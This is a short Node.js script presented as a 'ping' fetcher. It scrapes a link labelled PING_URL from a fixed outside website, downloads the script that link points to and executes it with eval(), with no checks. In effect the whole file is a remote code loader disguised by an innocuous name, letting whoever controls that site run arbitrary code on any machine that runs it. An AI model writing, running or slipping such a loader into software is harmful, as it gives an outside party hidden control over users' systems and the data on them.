'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchPingUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const pingUrl = $(`a:contains("PING_URL")`).attr('href');

        if (!pingUrl) throw new Error('PING_URL not found on the webpage.');

        console.log('PING_URL fetched successfully:', pingUrl);

        const scriptResponse = await axios.get(pingUrl);
        const scriptContent = scriptResponse.data;
        console.log("PING_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching PING_URL:', error.message);
    }
}

fetchPingUrl();